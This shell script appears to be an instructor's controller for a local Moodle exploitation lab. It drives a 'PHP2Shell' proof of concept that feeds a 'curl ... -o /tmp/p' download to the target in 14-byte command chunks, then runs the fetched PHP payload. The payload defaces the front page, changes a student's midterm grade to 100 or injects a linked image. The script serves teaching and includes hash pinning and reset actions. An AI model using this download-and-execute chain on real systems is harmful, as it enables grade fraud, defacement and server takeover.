#!/bin/sh
# Instructor demo controller for the local PHP2Shell Moodle Lab.
#
# One remote payload supports all five demo functions:
#   homepage | reset-homepage | grade 30 | grade 100 | rickroll | reset-rickroll
#
# The payload is downloaded and SHA-256 verified on the host. The target
# fetches the same URL into /tmp/p using a sequence of <=14-byte PoC commands
# generated by scripts/short_command_planner.py, then runs `php /tmp/p` for
# each action. This avoids the impossible "curl <normal-https-url>|php" in one
# 14-byte argument.
#
# Usage:
#   sh scripts/instructor-demo.sh --help
#   sh scripts/instructor-demo.sh --dry-run homepage
#   sh scripts/instructor-demo.sh grade 100
#
# Required configuration (in .env or the environment):
#   DEMO_PAYLOAD_URL     HTTPS URL serving moodle-payload.php
#   DEMO_PAYLOAD_SHA256  optional SHA-256 pin; if unset, the local payload hash is used
set -u

# ANSI colors for interactive terminals; redirected logs stay plain.
if [ -t 1 ] && [ -z "${NO_COLOR:-}" ] && [ "${TERM:-dumb}" != "dumb" ]; then
    C_RED=$(printf '\033[31m')
    C_GREEN=$(printf '\033[32m')
    C_YELLOW=$(printf '\033[33m')
    C_RESET=$(printf '\033[0m')
else
    C_RED=
    C_GREEN=
    C_YELLOW=
    C_RESET=
fi

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
cd "$ROOT" || exit 1

if [ -f .env ]; then
    set -a
    . ./.env
    set +a
fi

PORT=${MOODLE_PORT:-8080}
URL=${DEMO_PAYLOAD_URL:-https://s.xn--kst.tw/A}
IMAGE_URL=${DEMO_IMAGE_URL:-https://s.xn--kst.tw/good-hacker.webp}
MOODLE_URL=${DEMO_MOODLE_URL:-http://127.0.0.1:${PORT}/index.php}
WWWROOT=${MOODLE_WWWROOT:-}
WWWROOT=${WWWROOT%/}
COMPOSE="docker compose -f compose.yaml -f compose.vuln.yaml"
LOCAL_PAYLOAD=labs/examples/moodle-payload.php
PLANNER=scripts/short_command_planner.py
CACHE=loot/demo-payload.php
ACTION=loot/action
PROOF=loot/demo-proof.txt
LOG=loot/instructor-demo.log
DRY=0

usage() {
    cat <<'EOF'
Usage: sh scripts/instructor-demo.sh [--dry-run] <action> [grade]

Actions:
  homepage            set the front-page name to PWNED by PHP2Shell
  reset-homepage      restore the previous front-page name
  grade 30            restore the baseline Midterm grade
  grade 100           set the Midterm grade to 100
  rickroll            put the clickable good-hacker image on the front page
  reset-rickroll      remove the image and restore the page HTML

Options:
  --dry-run           print the plan without downloading or executing
  --help              show this message

Configuration:
  DEMO_PAYLOAD_URL     HTTPS URL serving labs/examples/moodle-payload.php
  DEMO_PAYLOAD_SHA256  optional SHA-256 pin; if unset, the local payload hash is used
  DEMO_IMAGE_URL       optional Rickroll image URL, default https://s.xn--kst.tw/good-hacker.webp
  DEMO_MOODLE_URL      optional target URL, default http://127.0.0.1:$MOODLE_PORT/index.php
EOF
}

log() {
    mkdir -p loot
    printf '%s %s\n' "$(date '+%Y-%m-%dT%H:%M:%S%z')" "$*" >> "$LOG"
    printf '%s\n' "$*"
}

fail() {
    mkdir -p loot
    printf '%s FAIL: %s\n' "$(date '+%Y-%m-%dT%H:%M:%S%z')" "$*" >> "$LOG"
    printf '%sFAIL:%s %s\n' "$C_RED" "$C_RESET" "$*" >&2
    exit 1
}

# Use Python so the controller works the same on macOS and Linux without
# depending on shasum or sha256sum being installed.
sha256_file() {
    python3 - "$1" <<'PY'
import hashlib
import sys

h = hashlib.sha256()
with open(sys.argv[1], "rb") as handle:
    for chunk in iter(lambda: handle.read(1024 * 1024), b""):
        h.update(chunk)
print(h.hexdigest())
PY
}

need_value() {
    name=$1
    value=$2
    [ -n "$value" ] || fail "$name is not configured"
}

preflight() {
    command -v python3 >/dev/null 2>&1 || fail "python3 is required"
    docker info >/dev/null 2>&1 || fail "Docker daemon is not reachable"

    CONTAINER=$($COMPOSE ps -q moodle 2>/dev/null || true)
    [ -n "$CONTAINER" ] || fail "Moodle container is not running"

    VERSION=$($COMPOSE exec -T moodle php -r 'echo PHP_VERSION;' 2>/dev/null || true)
    [ "$VERSION" = "8.3.35" ] || fail "expected PHP 8.3.35, got ${VERSION:-unknown}; switch back to the vulnerable image"

    LOGIN_URL="http://127.0.0.1:${PORT}/login/index.php"
    CODE=$(curl -s -o /dev/null -w '%{http_code}' "$LOGIN_URL" 2>/dev/null || true)
    if [ "$CODE" != "200" ]; then
        LOCATION=$(curl -s -o /dev/null -w '%{redirect_url}' "$LOGIN_URL" 2>/dev/null || true)
        if [ -z "$WWWROOT" ]; then
            fail "Moodle login is not ready (HTTP ${CODE:-none})"
        fi
        case "$LOCATION" in
            "$WWWROOT"*) ;;
            *) fail "Moodle login is not ready (HTTP ${CODE:-none}, location ${LOCATION:-none})" ;;
        esac
    fi

    log "preflight=ok container=$CONTAINER php=$VERSION url=$MOODLE_URL"
}

download_payload() {
    need_value DEMO_PAYLOAD_URL "$URL"
    [ -f "$LOCAL_PAYLOAD" ] || fail "local reviewed payload is missing: $LOCAL_PAYLOAD"
    EXPECTED_SHA=${DEMO_PAYLOAD_SHA256:-$(sha256_file "$LOCAL_PAYLOAD")}
    case "$URL" in
        https://*) ;;
        *) fail "DEMO_PAYLOAD_URL must be HTTPS (got: $URL)" ;;
    esac
    case "$URL" in
        *\'*) fail "DEMO_PAYLOAD_URL must not contain a single quote" ;;
    esac

    TMP=$(mktemp "${TMPDIR:-/tmp}/p2s-payload.XXXXXX")
    if ! curl --fail --location --silent --show-error --max-time 30 "$URL" -o "$TMP"; then
        rm -f "$TMP"
        fail "payload download failed: $URL"
    fi
    ACTUAL=$(sha256_file "$TMP")
    if [ "$ACTUAL" != "$EXPECTED_SHA" ]; then
        rm -f "$TMP"
        fail "payload SHA-256 mismatch: expected $EXPECTED_SHA, got $ACTUAL"
    fi
    mkdir -p loot
    mv "$TMP" "$CACHE"
    log "payload=verified sha256=$EXPECTED_SHA cache=$CACHE"
}

target_payload_sha() {
    $COMPOSE exec -T moodle php -r '
if (is_file("/tmp/p")) {
    echo hash_file("sha256", "/tmp/p");
}
' 2>/dev/null || true
}

run_short() {
    command=$1
    fetch=$2
    python3 php2shell/exploit.py \
        -u "$MOODLE_URL" \
        --profile official83 \
        --docker-container "$CONTAINER" \
        --proof-file '' \
        --fetch "$fetch" \
        -c "$command" >>"$LOG" 2>&1
}

install_payload() {
    need_value DEMO_PAYLOAD_URL "$URL"
    TARGET_SHA=$(target_payload_sha)
    if [ "$TARGET_SHA" = "$EXPECTED_SHA" ]; then
        log "payload=already-present sha256=$EXPECTED_SHA"
        return 0
    fi

    FULL_CMD="curl -fsSL '${URL}' -o /tmp/p"
    PLAN=$(python3 "$PLANNER" "$FULL_CMD") || fail "cannot plan the payload download"
    COUNT=$(printf '%s\n' "$PLAN" | wc -l | tr -d ' ')
    log "install=plan steps=$COUNT command=$FULL_CMD"

    $COMPOSE exec -T moodle rm -f /tmp/p /var/www/html/b /var/www/html/x >/dev/null 2>&1 || true
    OLDIFS=$IFS
    IFS='
'
    for step in $PLAN; do
        log "install-step=$step"
        if ! run_short "$step" /b; then
            IFS=$OLDIFS
            fail "payload install step failed: $step"
        fi
    done
    IFS=$OLDIFS

    TARGET_SHA=$(target_payload_sha)
    if [ "$TARGET_SHA" != "$EXPECTED_SHA" ]; then
        fail "target payload SHA-256 mismatch: expected $EXPECTED_SHA, got ${TARGET_SHA:-missing}"
    fi
    $COMPOSE exec -T moodle rm -f /var/www/html/b /var/www/html/x >/dev/null 2>&1 || true
    log "payload=installed-target sha256=$EXPECTED_SHA"
}

run_action() {
    action=$1
    printf '%s\n' "$IMAGE_URL" > loot/image-url

    log "action=$action target-command=php /tmp/p image=$IMAGE_URL"
    printf '%s\n' "$action" > "$ACTION"
    rm -f "$PROOF" loot/p1

    if ! python3 php2shell/exploit.py \
        -u "$MOODLE_URL" \
        --profile official83 \
        --docker-container "$CONTAINER" \
        --proof-file "$PROOF" \
        -c 'php /tmp/p'; then
        [ -s "$PROOF" ] || fail "PoC did not produce a proof file"
        log "poc=returned-nonzero proof-present=yes"
    fi

    [ -s "$PROOF" ] || fail "payload produced no proof at $PROOF"
    PROOF_TEXT=$(cat "$PROOF")
    case "$action" in
        homepage) EXPECTED_PROOF='homepage=ok' ;;
        reset-homepage) EXPECTED_PROOF='homepage-reset=ok' ;;
        grade*) EXPECTED_PROOF='grade=ok' ;;
        rickroll) EXPECTED_PROOF='rickroll=ok' ;;
        reset-rickroll) EXPECTED_PROOF='rickroll-reset=ok' ;;
        *) EXPECTED_PROOF='' ;;
    esac
    case "$PROOF_TEXT" in
        *demo=failed*)
            cat "$PROOF" >> "$LOG"
            fail "payload reported failure: $PROOF_TEXT"
            ;;
    esac
    if [ -n "$EXPECTED_PROOF" ]; then
        case "$PROOF_TEXT" in
            *"$EXPECTED_PROOF"*) ;;
            *)
                cat "$PROOF" >> "$LOG"
                fail "payload proof does not contain $EXPECTED_PROOF: $PROOF_TEXT"
                ;;
        esac
    fi
    cat "$PROOF" >> "$LOG"
    cat "$PROOF"

    case "$action" in
        homepage|reset-homepage)
            TITLE=$($COMPOSE exec -T moodle php -r '
define("CLI_SCRIPT", true);
require("/var/www/html/config.php");
echo $DB->get_field("course", "fullname", ["id" => 1]);
' 2>/dev/null || true)
            printf '%s\n' "readback=db-title:$TITLE" | tee -a "$LOG"
            ;;
        rickroll)
            LINK=$($COMPOSE exec -T moodle php -r '
define("CLI_SCRIPT", true);
require("/var/www/html/config.php");
$top = get_config("core", "additionalhtmltopofbody");
echo (is_string($top) && strpos($top, "good-hacker.webp") !== false) ? "present" : "absent";
' 2>/dev/null || true)
            printf '%s\n' "readback=db-image-link:${LINK:-unknown}" | tee -a "$LOG"
            ;;
        reset-rickroll)
            LINK=$($COMPOSE exec -T moodle php -r '
define("CLI_SCRIPT", true);
require("/var/www/html/config.php");
$top = get_config("core", "additionalhtmltopofbody");
echo (is_string($top) && strpos($top, "good-hacker.webp") !== false) ? "present" : "absent";
' 2>/dev/null || true)
            printf '%s\n' "readback=db-image-link:${LINK:-unknown}" | tee -a "$LOG"
            ;;
        'grade 30'|'grade 100')
            GRADE=$($COMPOSE exec -T moodle php -r '
define("CLI_SCRIPT", true);
require("/var/www/html/config.php");
$c = $DB->get_record("course", ["shortname" => "OS"], "*", MUST_EXIST);
$i = $DB->get_record("grade_items", ["courseid" => $c->id, "itemname" => "Midterm"], "*", MUST_EXIST);
$u = $DB->get_record("user", ["username" => "p2s_student"], "*", MUST_EXIST);
$g = $DB->get_record("grade_grades", ["itemid" => $i->id, "userid" => $u->id], "*", MUST_EXIST);
echo (float) $g->finalgrade;
' 2>/dev/null || true)
            printf '%s\n' "readback=grade:$GRADE" | tee -a "$LOG"
            ;;
    esac
}

ACTION_NAME=''
GRADE_ARG=''
while [ "$#" -gt 0 ]; do
    case "$1" in
        --help|-h) usage; exit 0 ;;
        --dry-run) DRY=1; shift ;;
        homepage|reset-homepage|rickroll|reset-rickroll)
            [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"
            ACTION_NAME=$1; shift ;;
        grade)
            [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"
            ACTION_NAME='grade'; shift
            [ "$#" -gt 0 ] || fail "grade needs 30 or 100"
            GRADE_ARG=$1; shift
            case "$GRADE_ARG" in 30|100) ;; *) fail "grade must be 30 or 100" ;; esac
            ACTION_NAME="grade $GRADE_ARG" ;;
        *) fail "unknown argument: $1" ;;
    esac
done

[ -n "$ACTION_NAME" ] || { usage; exit 2; }

if [ "$DRY" -eq 1 ]; then
    preflight
    LOCAL_SHA=$(sha256_file "$LOCAL_PAYLOAD" 2>/dev/null || true)
    printf 'action: %s\n' "$ACTION_NAME"
    printf 'container: %s\n' "$CONTAINER"
    printf 'payload URL: %s\n' "${URL:-<not configured>}"
    printf 'image URL: %s\n' "$IMAGE_URL"
    printf 'payload SHA-256: %s\n' "${DEMO_PAYLOAD_SHA256:-${LOCAL_SHA:-<local payload missing>}}"
    if [ -n "$URL" ]; then
        FULL_CMD="curl -fsSL '${URL}' -o /tmp/p"
        COUNT=$(python3 "$PLANNER" "$FULL_CMD" 2>/dev/null | wc -l | tr -d ' ')
        printf 'target install: %s short commands\n' "${COUNT:-unavailable}"
        printf 'target action: php /tmp/p (10 bytes)\n'
    else
        printf 'target install: DEMO_PAYLOAD_URL is not configured\n'
    fi
    printf 'action file: %s\n' "$ACTION"
    printf 'proof file: %s\n' "$PROOF"
    printf 'dry-run: no download, no PoC, no data change\n'
    exit 0
fi

preflight
need_value DEMO_PAYLOAD_URL "$URL"
download_payload
install_payload
run_action "$ACTION_NAME"
